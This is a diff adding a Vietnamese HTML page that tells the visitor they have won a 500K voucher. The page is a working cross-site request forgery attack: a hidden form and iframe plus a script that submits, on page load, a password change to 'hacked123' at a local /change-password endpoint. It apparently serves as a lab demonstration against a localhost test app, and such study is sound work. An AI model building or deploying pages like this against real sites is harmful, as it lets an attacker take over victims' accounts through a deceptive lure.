@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Bạn trúng thưởng!</title>
+</head>
+
+<body>
+    <h1>🎉 Chúc mừng bạn đã trúng 1 voucher 500K! 🎉</h1>
+    <p>Đang xử lý quà tặng của bạn, vui lòng đợi giây lát...</p>
+    <iframe name="csrf-iframe" style="display:none;"></iframe>
+    <form id="csrf-form" action="http://127.0.0.1:5000/change-password" method="POST" target="csrf-iframe"
+        style="display:none;">
+        <input type="hidden" name="new_password" value="hacked123">
+    </form>
+    <script>
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+
+</html>
